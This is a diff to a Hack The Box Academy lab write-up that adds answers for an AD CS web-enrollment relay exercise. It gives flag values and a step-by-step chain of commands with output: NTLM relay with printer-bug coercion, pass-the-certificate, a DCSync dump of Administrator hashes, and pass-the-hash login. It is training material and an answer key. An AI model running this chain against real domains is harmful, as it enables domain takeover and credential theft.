@@ -194,9 +194,67 @@ In certain environments, an attacker may be able to obtain a certificate but be 
 
 ## Questions
 Authenticate to **10.129.234.174** (ACADEMY-PWATTCK-PTCDC01), **10.129.234.172** (ACADEMY-PWATTCK-PTCCA01) with user `wwhite` and password `package5shores_topher1`
-1. What are the contents of flag.txt on jpinkman's desktop? **Answer:**
-2. What are the contents of flag.txt on Administrator's desktop? **Answer:**
+1. What are the contents of flag.txt on jpinkman's desktop? **Answer: 3d7e3dfb56b200ef715cfc300f07f3f8**
+   - Try to curl each target to identify which one is the web enrollment service. In this scenario it is the 10.129.234.174
+   - Use Impacket’s ntlmrelayx to listen for inbound connections and relay them to the web enrollment service:
+        ```sh
+        $ impacket-ntlmrelayx -t http://10.129.234.172/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+        ``` 
+   - Abuse the printer bug to force 10.129.234.174 (DC01) to attempt authentication agains our attack host (10.10.14.59):
+        ```sh
+        python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.174 10.10.14.59
+        ```
+   - The authentication request was then successfully relayed to the web enrollment application, and a certificate was issued for DC01$, stored at ./'DC01$.pfx':
+        ```sh
+        <SNIP>
+        [*] Generating CSR...
+        [*] CSR generated!
+        [*] Getting certificate...
+        [*] GOT CERTIFICATE! ID 8
+        [*] Writing PKCS#12 certificate to ./DC01$.pfx
+        [*] Certificate successfully written to file
+        ```
+   - Perform a Pass-the-Certificate attack to obtain a TGT as DC01$:
+        ```sh
+        $ python3 gettgtpkinit.py -cert-pfx ../'DC01$.pfx' -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache
+        2026-03-03 08:12:52,723 minikerberos INFO     Loading certificate and key from file
+        2026-03-03 08:12:53,006 minikerberos INFO     Requesting TGT
+        2026-03-03 08:13:05,662 minikerberos INFO     AS-REP encryption key (you might need this later):
+        2026-03-03 08:13:05,662 minikerberos INFO     018058ec75a50e5d20a30f3c5baa05e83af39594094f4d157b9f27fac477d682
+        2026-03-03 08:13:05,666 minikerberos INFO     Saved TGT to file
 
-> https://medium.com/@isaddanr/htb-password-attacks-all-questions-and-answers-part-3-pass-the-hash-pass-the-ticket-and-pass-090e37b46255
+        ```
+   - Perform a DCSync attack with the retrieved TGT to retrieve the NTLM hash of the domain administrator account:
+        ```sh
+        $ export KRB5CCNAME=/tmp/dc.ccache
+        # Modify the /etc/hosts file to point the hostname to the target domain controller
+        $ cat /etc/hosts
+        <SNIP>
+        10.129.234.174 DC01.INLANEFREIGHT.LOCAL
+        $ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
+        Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
 
-DM LAB LOI ROI DEO LAM DUOC.
+        [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+        [*] Using the DRSUAPI method to get NTDS.DIT secrets
+        Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd02e525dd676fd8ca04e200d265f20c:::
+        [*] Kerberos keys grabbed
+        Administrator:aes256-cts-hmac-sha1-96:ec2223ff4c0bce238aa04d30be0fe9e634495f9449c0c25307c66d7c12d8f93a
+        Administrator:aes128-cts-hmac-sha1-96:ffb8855b50dd1bf538c8001620c4f1d1
+        Administrator:des-cbc-md5:a1f262b50b64c46b
+        [*] Cleaning up...
+        ```
+   - Use evil-winrm with PtH technique to log in as the Administrator and read the flag:
+        ```sh
+        $ evil-winrm -i 10.129.234.174 -u Administrator -H fd02e525dd676fd8ca04e200d265f20c
+        <SNIP>
+        *Evil-WinRM* PS C:\Users\jpinkman\Desktop> more flag.txt
+        3d7e3dfb56b200ef715cfc300f07f3f8
+        ```
+
+2. What are the contents of flag.txt on Administrator's desktop? **Answer: a1fc497a8433f5a1b4c18274019a2cdb**
+   - Use the same evil-winrm session and read the flag on Administrator's desktop:
+        ```sh
+        *Evil-WinRM* PS C:\Users\Administrator\Desktop> more flag.txt
+        a1fc497a8433f5a1b4c18274019a2cdb
+        ```
+   - Another way to solve this: https://medium.com/@isaddanr/htb-password-attacks-all-questions-and-answers-part-3-pass-the-hash-pass-the-ticket-and-pass-090e37b46255
